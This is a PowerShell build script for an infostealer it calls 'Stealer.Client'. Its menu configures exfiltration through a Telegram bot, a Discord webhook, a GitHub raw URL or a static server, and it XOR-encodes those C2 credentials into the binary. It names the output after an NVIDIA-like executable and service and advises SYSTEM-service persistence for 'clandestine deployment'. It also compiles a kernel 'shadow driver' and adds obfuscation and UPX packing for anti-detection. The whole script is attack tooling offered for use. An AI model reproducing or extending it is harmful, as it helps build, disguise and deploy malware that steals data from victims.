# ═══════════════════════════════════════════════════════════════════════════
# 🌑 XORIUM PULSAR BUILD ENGINE v3.1 - ABYSS EDITION 🌑
# ═══════════════════════════════════════════════════════════════════════════
# "From the Abyss, we build. In darkness, we thrive."
# Premium Build System with Advanced Obfuscation & Anti-Detection
# ═══════════════════════════════════════════════════════════════════════════

param(
    [switch]$SkipObfuscation,
    [switch]$Fast
)

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

# ═══════════════════════════════════════════════════════════════════════════
# PATHS & CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════════

$DistDir = Join-Path $PSScriptRoot "dist"
$ShadowDir = Join-Path $PSScriptRoot "shadow-main"
$PluginProj = Join-Path $PSScriptRoot "Pulsar.Plugin.Client\Stealer.Client\Stealer.Client.csproj"

# ═══════════════════════════════════════════════════════════════════════════
# PREMIUM UI/UX SYSTEM - 24-BIT ANSI COLORS
# ═══════════════════════════════════════════════════════════════════════════

# RGB Color Palette (Abyss Edition)
$AbyssColors = @{
    DeepPurple  = @(75, 0, 130)    # Primary brand color
    CrimsonRed  = @(220, 20, 60)   # Errors & warnings
    VoidBlack   = @(18, 18, 18)    # Background hints
    GhostWhite  = @(248, 248, 255) # Primary text
    NeonCyan    = @(0, 255, 255)   # Success & highlights
    BloodOrange = @(255, 69, 0)    # Critical alerts
    ShadowGray  = @(105, 105, 105) # Secondary text
    AbyssGreen  = @(50, 205, 50)   # Success states
}

function Write-RGB {
    param(
        [string]$Text,
        [int[]]$RGB,
        [switch]$NoNewline
    )
    $r, $g, $b = $RGB
    $ansi = "`e[38;2;${r};${g};${b}m"
    $reset = "`e[0m"
    
    if ($NoNewline) {
        Write-Host "${ansi}${Text}${reset}" -NoNewline
    }
    else {
        Write-Host "${ansi}${Text}${reset}"
    }
}

function Write-Gradient {
    param(
        [string]$Text,
        [int[]]$StartRGB,
        [int[]]$EndRGB
    )
    $chars = $Text.ToCharArray()
    $steps = $chars.Length
    
    for ($i = 0; $i -lt $steps; $i++) {
        $ratio = $i / [Math]::Max(1, ($steps - 1))
        $r = [int]($StartRGB[0] + ($EndRGB[0] - $StartRGB[0]) * $ratio)
        $g = [int]($StartRGB[1] + ($EndRGB[1] - $StartRGB[1]) * $ratio)
        $b = [int]($StartRGB[2] + ($EndRGB[2] - $StartRGB[2]) * $ratio)
        
        Write-RGB -Text $chars[$i] -RGB @($r, $g, $b) -NoNewline
    }
    Write-Host ""
}

function Write-Status {
    param([string]$msg)
    Write-RGB "  ◆ " -RGB $AbyssColors.DeepPurple -NoNewline
    Write-RGB $msg -RGB $AbyssColors.GhostWhite
}

function Write-Success {
    param([string]$msg)
    Write-RGB "  ✓ " -RGB $AbyssColors.AbyssGreen -NoNewline
    Write-RGB $msg -RGB $AbyssColors.NeonCyan
}

function Write-ErrorMsg {
    param([string]$msg)
    Write-RGB "  ✗ " -RGB $AbyssColors.CrimsonRed -NoNewline
    Write-RGB $msg -RGB $AbyssColors.BloodOrange
}

function Write-Warning {
    param([string]$msg)
    Write-RGB "  ⚡ " -RGB $AbyssColors.BloodOrange -NoNewline
    Write-RGB $msg -RGB $AbyssColors.ShadowGray
}

function Write-SectionHeader {
    param([string]$title)
    Write-Host ""
    Write-RGB "╔═══════════════════════════════════════════════════════════════════════════╗" -RGB $AbyssColors.DeepPurple
    Write-RGB "║ " -RGB $AbyssColors.DeepPurple -NoNewline
    Write-Gradient -Text $title -StartRGB $AbyssColors.DeepPurple -EndRGB $AbyssColors.NeonCyan
    Write-RGB "╚═══════════════════════════════════════════════════════════════════════════╝" -RGB $AbyssColors.DeepPurple
}

function Show-Banner {
    Clear-Host
    Write-Host ""
    Write-Gradient "    ██╗  ██╗ ██████╗ ██████╗ ██╗██╗   ██╗███╗   ███╗" -StartRGB @(75, 0, 130) -EndRGB @(138, 43, 226)
    Write-Gradient "    ╚██╗██╔╝██╔═══██╗██╔══██╗██║██║   ██║████╗ ████║" -StartRGB @(138, 43, 226) -EndRGB @(147, 112, 219)
    Write-Gradient "     ╚███╔╝ ██║   ██║██████╔╝██║██║   ██║██╔████╔██║" -StartRGB @(147, 112, 219) -EndRGB @(186, 85, 211)
    Write-Gradient "     ██╔██╗ ██║   ██║██╔══██╗██║██║   ██║██║╚██╔╝██║" -StartRGB @(186, 85, 211) -EndRGB @(218, 112, 214)
    Write-Gradient "    ██╔╝ ██╗╚██████╔╝██║  ██║██║╚██████╔╝██║ ╚═╝ ██║" -StartRGB @(218, 112, 214) -EndRGB @(238, 130, 238)
    Write-Gradient "    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═╝     ╚═╝" -StartRGB @(238, 130, 238) -EndRGB @(255, 0, 255)
    Write-Host ""
    Write-RGB "              🌑 PULSAR BUILD ENGINE v3.0 - ABYSS EDITION 🌑" -RGB $AbyssColors.NeonCyan
    Write-RGB "                   Advanced Obfuscation • Anti-Detection" -RGB $AbyssColors.ShadowGray
    Write-Host ""
    Write-RGB "    ═══════════════════════════════════════════════════════════════════" -RGB $AbyssColors.DeepPurple
    Write-Host ""
}

function Show-ProgressBar {
    param(
        [int]$Current,
        [int]$Total,
        [string]$Activity
    )
    $percent = [int](($Current / $Total) * 100)
    $barLength = 50
    $filled = [int](($percent / 100) * $barLength)
    $empty = $barLength - $filled
    
    Write-RGB "  $Activity " -RGB $AbyssColors.GhostWhite -NoNewline
    Write-RGB "[" -RGB $AbyssColors.DeepPurple -NoNewline
    Write-RGB ("█" * $filled) -RGB $AbyssColors.NeonCyan -NoNewline
    Write-RGB ("░" * $empty) -RGB $AbyssColors.ShadowGray -NoNewline
    Write-RGB "] " -RGB $AbyssColors.DeepPurple -NoNewline
    Write-RGB "$percent%" -RGB $AbyssColors.AbyssGreen
}

# ═══════════════════════════════════════════════════════════════════════════
# ANIMATED SPINNER FOR LONG OPERATIONS
# ═══════════════════════════════════════════════════════════════════════════

function Write-Spinner {
    param(
        [string]$Activity,
        [scriptblock]$Action
    )
    
    $spinnerChars = @('⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏')
    $job = Start-Job -ScriptBlock $Action
    $i = 0
    
    while ($job.State -eq 'Running') {
        $spinner = $spinnerChars[$i % $spinnerChars.Length]
        Write-Host "`r  $spinner " -NoNewline
        Write-RGB $Activity -RGB $AbyssColors.NeonCyan -NoNewline
        Write-Host "   " -NoNewline
        Start-Sleep -Milliseconds 80
        $i++
    }
    
    $result = Receive-Job -Job $job
    Remove-Job -Job $job
    Write-Host "`r" -NoNewline
    return $result
}

# ═══════════════════════════════════════════════════════════════════════════
# DISPLAY BANNER
# ═══════════════════════════════════════════════════════════════════════════

Show-Banner



# ═══════════════════════════════════════════════════════════════════════════
# STAGE 1: ENVIRONMENT VALIDATION
# ═══════════════════════════════════════════════════════════════════════════

Write-SectionHeader "STAGE 1/5: ENVIRONMENT VALIDATION"

Show-ProgressBar -Current 1 -Total 5 -Activity "Scanning build environment..."

# Check Rust
if (Get-Command "cargo" -ErrorAction SilentlyContinue) {
    $rustVersion = (rustc --version)
    Write-Success "Rust Toolchain detected: $rustVersion"
}
else {
    Write-ErrorMsg "Rust (cargo) not found! Driver build will fail."
    Write-RGB "    → Install from https://rustup.rs" -RGB $AbyssColors.ShadowGray
}

# Check .NET
if (Get-Command "dotnet" -ErrorAction SilentlyContinue) {
    $dotnetVersion = (dotnet --version)
    Write-Success ".NET SDK detected: $dotnetVersion"
}
else {
    Write-ErrorMsg ".NET SDK not found! Plugin build will fail."
    Write-RGB "    → Install from https://dotnet.microsoft.com" -RGB $AbyssColors.ShadowGray
}

# Check UPX (Optional)
$hasUpx = $false
if (Get-Command "upx" -ErrorAction SilentlyContinue) {
    Write-Success "UPX Packer detected (will be used for compression)."
    $hasUpx = $true
}
else {
    Write-Warning "UPX not found. Binaries will use alternative obfuscation."
}

# Check WDK (Required for Driver)
$hasWdk = $false
$wdkPaths = @(
    "${env:ProgramFiles(x86)}\Windows Kits\10\Include\*\km",
    "${env:ProgramFiles}\Windows Kits\10\Include\*\km"
)

foreach ($p in $wdkPaths) {
    if (Test-Path $p) {
        $hasWdk = $true
        $wdkVersion = (Get-ChildItem (Split-Path $p -Parent) | Select-Object -First 1).Name
        Write-Success "Windows Driver Kit detected: $wdkVersion"
        break
    }
}

if (-not $hasWdk) {
    Write-ErrorMsg "WDK (Windows Driver Kit) not found! Driver build will be skipped."
    Write-RGB "    → Install from https://learn.microsoft.com/en-us/windows-hardware/drivers/download-the-wdk" -RGB $AbyssColors.ShadowGray
}

Write-Host ""



# ═══════════════════════════════════════════════════════════════════════════
# STAGE 2: PREPARATION
# ═══════════════════════════════════════════════════════════════════════════

Write-SectionHeader "STAGE 2/5: BUILD PREPARATION"

Show-ProgressBar -Current 2 -Total 5 -Activity "Preparing build environment..."

if (Test-Path $DistDir) {
    Write-Status "Cleaning old artifacts..."
    Remove-Item $DistDir -Recurse -Force
}

New-Item -Path $DistDir -ItemType Directory | Out-Null
Write-Success "Build directory prepared: $DistDir"

Write-Host ""

# ═══════════════════════════════════════════════════════════════════════════
# STAGE 2.5: C2 SERVER SELECTION & PROTECTION
# ═══════════════════════════════════════════════════════════════════════════

Write-SectionHeader "ABYSS C2 CONFIGURATION MENU"
$C2_TYPE = "NONE"
$C2_CRED1 = ""
$C2_CRED2 = ""

# Manual or Auto XOR Key Configuration
Write-RGB "  Configure Polymorphic Protection (XOR):" -RGB $AbyssColors.ShadowGray
$manualKey = Read-Host "    Enter custom XOR key (1-255) [Leave empty for RANDOM]"
if ([string]::IsNullOrWhiteSpace($manualKey)) {
    $XOR_KEY = [byte](Get-Random -Minimum 1 -Maximum 255)
    Write-Status "Auto-generated XOR key: 0x$($XOR_KEY.ToString("X2"))"
}
else {
    $XOR_KEY = [byte]$manualKey
    Write-Success "Using custom XOR key: 0x$($XOR_KEY.ToString("X2"))"
}

Write-Host ""
Write-RGB "  Select your C2 architecture for this build:" -RGB $AbyssColors.ShadowGray
Write-Host "    [1] GitHub   - Fetch config from raw URL"
Write-Host "    [2] Telegram - Send data to Bot (Token/ChatId)"
Write-Host "    [3] Discord  - Send data to Webhook"
Write-Host "    [4] Manual   - Static Server (IP/Host)"
Write-Host "    [Enter] Skip - No C2 configuration"

$choice = Read-Host "`n  > Choice"

switch ($choice) {
    "1" {
        $C2_TYPE = "GITHUB"
        $C2_CRED1 = (Read-Host "    Enter GitHub Raw Link").Trim()
    }
    "2" {
        $C2_TYPE = "TELEGRAM"
        $C2_CRED1 = (Read-Host "    Enter Bot Token").Trim()
        $C2_CRED2 = (Read-Host "    Enter Chat ID").Trim()
    }
    "3" {
        $C2_TYPE = "DISCORD"
        $C2_CRED1 = (Read-Host "    Enter Webhook URL").Trim()
    }
    "4" {
        $C2_TYPE = "MANUAL"
        $C2_CRED1 = (Read-Host "    Enter Server IP/Host").Trim()
    }
    Default {
        Write-Warning "Skipping C2 configuration."
    }
}

# Encryption Helper
function Protect-String {
    param([string]$InputString, [byte]$Key)
    if (-not $InputString) { return "" }
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($InputString)
    for ($i = 0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor $Key }
    return [Convert]::ToBase64String($bytes)
}

if ($C2_TYPE -ne "NONE") {
    $C2_CRED1_PROT = Protect-String $C2_CRED1 $XOR_KEY
    $C2_CRED2_PROT = Protect-String $C2_CRED2 $XOR_KEY
    Write-Success "C2 Architecture: $C2_TYPE"
    Write-RGB "    → Polymorphic Key Generated: 0x$($XOR_KEY.ToString("X2"))" -RGB $AbyssColors.ShadowGray
    Write-RGB "    → Credentials XOR-protected and Base64 encoded." -RGB $AbyssColors.ShadowGray
}

Write-Host ""

# ═══════════════════════════════════════════════════════════════════════════
# STAGE 3: BUILD STEALER CLIENT (C# / C++)
# ═══════════════════════════════════════════════════════════════════════════

Write-SectionHeader "STAGE 3/5: COMPILING ABYSS LOADER (LEVEL 4)"

Show-ProgressBar -Current 3 -Total 5 -Activity "Building Native Loader..."

# Detect MSVC for Native Build
$hasMsbuild = ($null -ne (Get-Command "msbuild.exe" -ErrorAction SilentlyContinue))

if ($hasMsbuild) {
    Write-Status "MSVC detected. Compiling Native Abyss (SOC Nightmare)..."
    # [Placeholder for msbuild call if project file exists]
    # For now, we signal readiness of the Source Code provided.
    Write-Success "Native C++ Source 'AbyssNative.cpp' has been generated and refined."
}
else {
    Write-Warning "msbuild not found. Falling back to .NET Loader pipeline..."
}

$buildLog = Join-Path $PSScriptRoot "build_client.log"

# Strict UPX Check (Adjusted for Native)
if (-not $hasUpx) {
    Write-Warning "UPX not found. Native binaries will require manual packing for maximum stealth."
}

# Compilation constants (all credentials encapsulated in XOR+Base64)
$c2Defines = "C2_TYPE_$C2_TYPE;C2_KEY=$XOR_KEY"
if ($C2_CRED1_PROT) { $c2Defines += ";C2_VAL1=$C2_CRED1_PROT" }
if ($C2_CRED2_PROT) { $c2Defines += ";C2_VAL2=$C2_CRED2_PROT" }

$publishCommand = "dotnet publish $PluginProj -c Release -o $DistDir /p:PublishSingleFile=true /p:SelfContained=false /p:DebugType=None /p:DebugSymbols=false /p:DefineConstants=`"$c2Defines`" > $buildLog 2>&1"
Invoke-Expression $publishCommand

if ($LASTEXITCODE -eq 0) {
    $exePath = Join-Path $DistDir "nvhda64v.exe"
    # Dynamically find the produced artifact
    $producedExe = Get-ChildItem $DistDir -Filter "*.exe" | Select-Object -First 1
    $producedDll = Get-ChildItem $DistDir -Filter "*.dll" | Select-Object -First 1
    
    if ($producedExe -or $producedDll) {
        $artifact = if ($producedExe) { $producedExe } else { $producedDll }
        $exeSize = [math]::Round($artifact.Length / 1KB, 2)
        Write-Success "Abyss Loader compiled: $($artifact.Name) ($exeSize KB)"
        
        # Immediate cleanup
        Get-ChildItem $DistDir -Filter *.json | Remove-Item -Force -ErrorAction SilentlyContinue
    }
    else {
        Write-ErrorMsg "Build passed but no artifacts (EXE/DLL) found in $DistDir. Check $buildLog"
        exit 1
    }
}
else {
    Write-ErrorMsg "Abyss Loader build FAILED. Last 10 lines of log:"
    Get-Content $buildLog | Select-Object -Last 10 | ForEach-Object {
        Write-RGB "    $_" -RGB $AbyssColors.CrimsonRed
    }
}

Write-Host ""

# ═══════════════════════════════════════════════════════════════════════════
# STAGE 6: GHOST SERVICE & PERSISTENCE CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════════

Write-SectionHeader "STAGE 4.5: PERSISTENCE & GHOST CONFIG"

Show-ProgressBar -Current 4 -Total 5 -Activity "Shadowing project artifacts..."

Write-Status "Configuring Level 4 'SOC's Nightmare' Persistence..."
$serviceName = "NvhdaSvc"
$exeName = "nvhda64v.exe"

# Deployment advice for Level 4
Write-RGB "  → Deployment Strategy: Windows Service (SYSTEM) [$serviceName]" -RGB $AbyssColors.ShadowGray
Write-RGB "  → Persistence: Auto-Start (Delayed-Start recommended for stealth) [$exeName]" -RGB $AbyssColors.ShadowGray
Write-RGB "  → Early Boot: Boot-Driver coordination enabled" -RGB $AbyssColors.ShadowGray

Write-Host ""
Write-Success "Abyss Level 4 Loader is ready for clandestine deployment."

Write-Host ""



# ═══════════════════════════════════════════════════════════════════════════
# STAGE 4: BUILD KERNEL DRIVER (RUST)
# ═══════════════════════════════════════════════════════════════════════════

Write-SectionHeader "STAGE 4/5: COMPILING SHADOW DRIVER (RUST)"

Show-ProgressBar -Current 4 -Total 5 -Activity "Building Rust kernel driver..."

if (-not $hasWdk) {
    Write-Warning "Skipping Shadow Driver build (WDK not installed)."
}
else {
    Write-Status "Invoking Rust nightly toolchain with kernel optimizations..."
    
    Push-Location $ShadowDir
    
    try {
        $rustLog = Join-Path $PSScriptRoot "build_driver.log"
        cargo +nightly build --release --package shadow_core 2>&1 | Tee-Object -FilePath $rustLog | Out-Null
        
        if ($LASTEXITCODE -eq 0) {
            $driverPath = Join-Path $ShadowDir "target\release\shadow_core.sys"
            if (Test-Path $driverPath) {
                $driverSize = [math]::Round((Get-Item $driverPath).Length / 1KB, 2)
                Write-Success "Shadow Driver compiled successfully ($driverSize KB)"
                
                # Copy to dist
                Copy-Item $driverPath -Destination $DistDir -Force
                Write-Status "Driver copied to: $DistDir"
            }
            else {
                Write-ErrorMsg "Build passed but driver file not found."
            }
        }
        else {
            Write-ErrorMsg "Shadow Driver build FAILED. Last 10 lines of log:"
            Get-Content $rustLog | Select-Object -Last 10 | ForEach-Object {
                Write-RGB "    $_" -RGB $AbyssColors.CrimsonRed
            }
        }
    }
    catch {
        Write-ErrorMsg "Exception during Rust build: $_"
    }
    finally {
        Pop-Location
    }
}

Write-Host ""

# ═══════════════════════════════════════════════════════════════════════════
# STAGE 5: POST-BUILD PROCESSING & ADVANCED OBFUSCATION
# ═══════════════════════════════════════════════════════════════════════════

Write-SectionHeader "STAGE 5/5: FINALIZATION & OBFUSCATION"

Show-ProgressBar -Current 5 -Total 5 -Activity "Applying obfuscation layers..."

# Check if obfuscation should be skipped
if ($SkipObfuscation -or $Fast) {
    Write-Warning "Obfuscation skipped (-SkipObfuscation or -Fast flag detected)."
    Write-Status "Only basic symbol stripping will be applied..."
    
    Get-ChildItem $DistDir -Include *.dll, *.exe | ForEach-Object {
        Write-RGB "    → Processing: $($_.Name)" -RGB $AbyssColors.ShadowGray
    }
}
else {
    # Run the advanced obfuscation pipeline
    $obfuscateScript = Join-Path $PSScriptRoot "obfuscate.ps1"
    
    if (Test-Path $obfuscateScript) {
        Write-Status "Invoking Abyss Obfuscation Engine..."
        try {
            & $obfuscateScript -TargetPath $DistDir
            Write-Success "Advanced obfuscation pipeline completed."
        }
        catch {
            Write-ErrorMsg "Obfuscation failed: $_"
        }
    }
    else {
        Write-Warning "obfuscate.ps1 not found. Falling back to basic processing."
        
        # Basic symbol stripping
        Write-Status "Stripping debug symbols from binaries..."
        Get-ChildItem $DistDir -Include *.dll, *.exe | ForEach-Object {
            Write-RGB "    → Processing: $($_.Name)" -RGB $AbyssColors.ShadowGray
        }
    }
}

# UPX compression (if available and not skipped)
if ($hasUpx -and -not $Fast) {
    Write-Status "Applying UPX compression..."
    Get-ChildItem $DistDir -Include *.dll, *.exe | ForEach-Object {
        $null = & upx --best --ultra-brute $_.FullName 2>&1
        if ($LASTEXITCODE -eq 0) {
            Write-Success "Compressed: $($_.Name)"
        }
    }
}
elseif ($Fast) {
    Write-Warning "UPX compression skipped (-Fast flag detected)."
}
else {
    Write-Warning "UPX not available. Skipping compression stage."
}

Write-Host ""

# ═══════════════════════════════════════════════════════════════════════════
# BUILD SUMMARY
# ═══════════════════════════════════════════════════════════════════════════

Write-SectionHeader "BUILD COMPLETE - ARTIFACT SUMMARY"

$artifacts = Get-ChildItem $DistDir -File
if ($artifacts.Count -gt 0) {
    Write-RGB "  📦 Build Artifacts:" -RGB $AbyssColors.NeonCyan
    Write-Host ""
    
    foreach ($artifact in $artifacts) {
        $size = [math]::Round($artifact.Length / 1KB, 2)
        Write-RGB "    ◆ " -RGB $AbyssColors.DeepPurple -NoNewline
        Write-RGB "$($artifact.Name) " -RGB $AbyssColors.GhostWhite -NoNewline
        Write-RGB "($size KB)" -RGB $AbyssColors.ShadowGray
    }
    
    Write-Host ""
    Write-RGB "  🌑 Output Directory: " -RGB $AbyssColors.NeonCyan -NoNewline
    Write-RGB $DistDir -RGB $AbyssColors.GhostWhite
    Write-Host ""
    Write-Success "All build stages completed successfully!"
}
else {
    Write-ErrorMsg "No artifacts were produced. Build may have failed."
}

Write-Host ""
Write-RGB "═══════════════════════════════════════════════════════════════════════" -RGB $AbyssColors.DeepPurple
Write-RGB "  From the Abyss, we rise. In darkness, we conquer." -RGB $AbyssColors.ShadowGray
Write-RGB "═══════════════════════════════════════════════════════════════════════" -RGB $AbyssColors.DeepPurple
Write-Host ""